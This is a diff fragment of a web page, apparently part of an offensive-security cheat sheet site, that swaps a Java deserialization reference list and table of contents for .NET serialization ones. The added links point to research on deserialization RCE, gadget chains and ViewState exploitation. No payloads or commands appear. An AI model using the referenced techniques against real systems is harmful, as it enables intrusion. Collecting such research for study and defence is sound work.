-<li>[Triggering a DNS lookup using Java Deserializatio]n -paranoidsoftware.com](<a href="https://blog.paranoidsoftware.com/triggering-a-dns-lookup-using-java-deserialization/">https://blog.paranoidsoftware.com/triggering-a-dns-lookup-using-java-deserialization/</a>)</li>
-<li><a href="https://www.gosecure.net/blog/2017/03/22/detecting-deserialization-bugs-with-dns-exfiltration/">Detecting deserialization bugs with DNS exfiltration - Philippe Arteau | Mar 22,2017</a></li>
-<li><a href="https://github.com/GrrrDog/Java-Deserialization-Cheat-Sheet/blob/master/README.md">Java-Deserialization-Cheat-Sheet -GrrrDog</a></li>
-<li><a href="https://diablohorn.com/2017/09/09/understanding-practicing-java-deserialization-exploits/">Understanding &amp; practicing java deserialization exploits</a></li>
-<li><a href="https://medium.com/@D0rkerDevil/how-i-found-a-1500-worth-deserialization-vulnerability-9ce753416e0a">How i found a 1500$ worth Deserialization vulnerability -@D0rkerDevil</a></li>
-<li><a href="https://www.alphabot.com/security/blog/2017/java/Misconfigured-JSF-ViewStates-can-lead-to-severe-RCE-vulnerabilities.html">Misconfigured JSF ViewStates can lead to severe RCE vulnerabilities - 14 Aug 2017, PeterStöckli</a></li>
-<li><a href="https://blog.doyensec.com/2019/07/22/jackson-gadgets.html">Jackson CVE-2019-12384: anatomy of a vulnerability class</a></li>
-<li><a href="https://medium.com/@cowtowncoder/on-jackson-cves-dont-panic-here-is-what-you-need-to-know-54cd0d6e8062#da96">On Jackson CVEs: Don’t Panic — Here is what you need to know</a></li>
-<li><a href="https://portswigger.net/research/pre-auth-rce-in-forgerock-openam-cve-2021-35464">Pre-auth RCE in ForgeRock OpenAM (CVE-2021-35464) - Michael Stepankin / @artsploit - 29 June 2021</a></li>
+<li><a href="https://speakerdeck.com/pwntester/attacking-net-serialization?slide=11">Attacking .NET Serialization - Alvaro - October 20, 2017</a></li>
+<li><a href="https://youtu.be/eDfGpu3iE4Q">Attacking .NET Deserialization - Alvaro Muñoz - 28 avr. 2018</a></li>
+<li><a href="https://www.blackhat.com/docs/us-17/thursday/us-17-Munoz-Friday-The-13th-Json-Attacks.pdf">Friday the 13th: JSON Attacks - Alvaro Muñoz (@pwntester) Oleksandr Mirosh - Slides</a></li>
+<li><a href="https://www.blackhat.com/docs/us-17/thursday/us-17-Munoz-Friday-The-13th-JSON-Attacks-wp.pdf">Friday the 13th: JSON Attacks - Alvaro Muñoz (@pwntester) Oleksandr Mirosh - White Paper</a></li>
+<li><a href="https://www.youtube.com/watch?v=ZBfBYoK_Wr0">Friday the 13th: JSON Attacks - Alvaro Muñoz (@pwntester) Oleksandr Mirosh - DEF CON 25 Conference</a></li>
+<li><a href="https://media.blackhat.com/bh-us-12/Briefings/Forshaw/BH_US_12_Forshaw_Are_You_My_Type_Slides.pdf">ARE YOU MY TYPE? Breaking .NET sandboxes through Serialization - James Forshaw - Slides</a></li>
+<li><a href="https://media.blackhat.com/bh-us-12/Briefings/Forshaw/BH_US_12_Forshaw_Are_You_My_Type_WP.pdf">ARE YOU MY TYPE? Breaking .NET sandboxes through Serialization - James Forshaw - White Paper</a></li>
+<li><a href="https://www.mandiant.com/resources/blog/hunting-deserialization-exploits">Now You Serial, Now You Don&rsquo;t - Systematically Hunting for Deserialization Exploits - ALYSSA RAHMANDEC</a></li>
+<li><a href="https://soroush.secproject.com/blog/2019/04/exploiting-deserialisation-in-asp-net-via-viewstate/">Exploiting Deserialisation in ASP.NET via ViewState - Soroush Dalili (@irsdl) - 04/2019</a></li>
+<li><a href="https://codewhitesec.blogspot.com/2022/06/bypassing-dotnet-serialization-binders.html">Bypassing .NET Serialization Binders - Markus Wulftange - June 28, 2022</a></li>
+<li><a href="https://book.hacktricks.xyz/pentesting-web/deserialization/basic-.net-deserialization-objectdataprovider-gadgets-expandedwrapper-and-json.net">Basic .Net deserialization (ObjectDataProvider gadget, ExpandedWrapper, and Json.Net) - hacktricks</a></li>
+<li><a href="https://blog.assetnote.io/2021/11/02/sitecore-rce/">Sitecore Experience Platform Pre-Auth RCE - CVE-2021-42237 - Nov 2, 2021 - Shubham Shah</a></li>
+<li><a href="https://muffsec.com/blog/finding-a-new-datacontractserializer-rce-gadget-chain/">Finding a New DataContractSerializer RCE Gadget Chain - November 7, 2019 - dugisec</a></li>
 </ul>
 </article>
  
@@ -1426,12 +1430,6 @@ exploit unsafe Java object deserialization.</p>
         
   <div class="flex flex-wrap justify-between">
 
-
-  <div><a class="flex align-center" href="https://github.com/m00tiny/grayhatfreelancing/commit/170e09c69d03d9f0089272c912f6a07bbfd04bb7" title='Last modified by Stuart Gray | March 27, 2023' target="_blank" rel="noopener">
-      <img src="/svg/calendar.svg" class="book-icon" alt="Calendar" />
-      <span>March 27, 2023</span>
-    </a>
-  </div>
 
 
 
@@ -1461,17 +1459,22 @@ exploit unsafe Java object deserialization.</p>
   
 <nav id="TableOfContents">
   <ul>
-    <li><a href="#java-deserialization">Java Deserialization</a>
+    <li><a href="#net-serialization">.NET Serialization</a>
       <ul>
+        <li><a href="#summary">Summary</a></li>
         <li><a href="#detection">Detection</a></li>
-        <li><a href="#tools">Tools</a>
+        <li><a href="#tools">Tools</a></li>
+        <li><a href="#formatters">Formatters</a>
           <ul>
-            <li><a href="#ysoserial">Ysoserial</a></li>
-            <li><a href="#burp-extensions-using-ysoserial">Burp extensions using ysoserial</a></li>
-            <li><a href="#alternative-tooling">Alternative Tooling</a></li>
+            <li><a href="#xmlserializer">XmlSerializer</a></li>
+            <li><a href="#datacontractserializer">DataContractSerializer</a></li>
+            <li><a href="#netdatacontractserializer">NetDataContractSerializer</a></li>
+            <li><a href="#losformatter">LosFormatter</a></li>
+            <li><a href="#jsonnet">JSON.NET</a></li>
+            <li><a href="#binaryformatter">BinaryFormatter</a></li>
           </ul>
         </li>
-        <li><a href="#gadgets">Gadgets</a></li>
+        <li><a href="#pop-gadgets">POP Gadgets</a></li>
         <li><a href="#references">References</a></li>
       </ul>
     </li>
